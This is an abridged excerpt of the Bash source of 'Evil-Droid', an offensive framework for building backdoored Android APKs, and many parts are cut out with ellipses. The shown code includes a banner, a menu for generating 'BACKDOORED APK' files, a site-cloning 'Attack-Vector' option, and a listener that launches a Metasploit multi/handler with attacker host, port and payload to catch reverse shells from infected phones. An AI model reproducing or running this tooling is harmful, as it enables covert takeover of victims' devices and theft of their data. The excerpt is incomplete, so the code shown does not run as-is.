...
spinlong ()
{
    ...
    while ((i < 100)); do
        n=$((i*barlength / 100))
        printf "\e[0;31m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
        ((i += RANDOM%5+2))
        sleep 0.02
    done
}
...
echo -e $red "             .           .           "          
echo -e $white "             M.          .M          "     
echo -e $red "              MMMMMMMMMMM.           "     
echo -e $white "           .MMM\MMMMMMM/MMM.         "     
echo -e $red "          .MMM.7MMMMMMM.7MMM.        "     
echo -e $white "         .MMMMMMMMMMMMMMMMMMM        "     
echo -e $red "         MMMMMMM.......MMMMMMM       "     
echo -e $white "         MMMMMMMMMMMMMMMMMMMMM       "     
echo -e $red "    MMMM MMMMMMMMMMMMMMMMMMMMM MMMM  "   
echo -e $white "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $red "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $white "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $red "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $white "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $red "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $white "   dMMMM.MMMMMMMMMMMMMMMMMMMMM.MMMMD "   
echo -e $red "    MMM8 MMMMMMMMMMMMMMMMMMMMM 8MMM  "   
echo -e $white "         MMMMMMMMMMMMMMMMMMMMM       "   
echo -e $red "         MMMMMMMMMMMMMMMMMMMMM       "   
echo -e $white "             MMMMM   MMMMM  $ver     "   
echo -e $red "             MMMMM   MMMMM           "   
echo -e $white "             MMMMM   MMMMM           "   
echo -e $red "             MMMMM   MMMMM           "   
echo -e $white "             .MMM.   .MMM.           " 
echo -e $red "     Mascerano Bachir - Dev-labs     "                                 
}
#function lhost
function get_lhost() 
{
...
function listener()
{
  xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 17 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
}
#function clone site
function clns()
{
...
while true; do
   echo ""
   atk_v=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Choose an option bellow:" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Attack-Vector" FALSE "Main-Menu" FALSE "Exit" --width 400 --height 300 2> /dev/null) 
   case $atk_v in
   Multi-Handler) listener;suite;;
   Attack-Vector) clns;spinlong;index_name;launcher;listener;suite;;
   Main-Menu) clear;main;;
   Exit) echo -e $white "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
   esac
done
}
#function suite
...
start=$(zenity --question --title="☢ Evil-Droid Framework ☢" --text "Execute framework and Services?" --width 270 2> /dev/null)
  if [ "$?" -eq "0" ]; then
    ...
    echo ""
    echo -e $red "╔──────────────────────────────────────────────╗"
    echo -e $white "|           Author: Mascerano Bachir           |"
    echo -e $red "|    Evil-Droid Framework $ver - Dev-labs.co   |"
    echo -e $white "|   Credits to : MrPedroubuntu , Kader Achraf  |"
    echo -e $red "|               , youcef yahia                 |"
    echo -e $white "|              and Mohammed Yacine             |"
    echo -e $red "┖──────────────────────────────────────────────┙"
    echo ""
    apache_svc_stop
    postgresql_stop
    ...
    do
        ...
        case "$option" in 
            1)  echo -e $white "[✔] APK MSF"
                ...
                echo
                ;;
            2)  echo -e $white "[✔] BACKDOOR APK ORIGINAL (OLD)"
                echo -e $red
                get_lhost
                get_lport
                echo
                ...
                sleep 2
                echo ""
                zenity --title "☢ EVIL-DROID ☢" --info --text "BACKDOORED APK : $path/evilapk/$apk_name.apk " --width 500 > /dev/null 2>&1
                atkv 
                echo
                ;;
            3)  echo -e $white "[✔] BACKDOOR APK ORIGINAL (NEW)"
                echo -e $red
                get_lhost
                get_lport
                echo
            ...
            5)  echo -e $white "[✔] START LISTENER"
                ...
                echo
                ;;
            c)  echo -e $white "[✔] clean up all files"
                echo
                clean
                echo
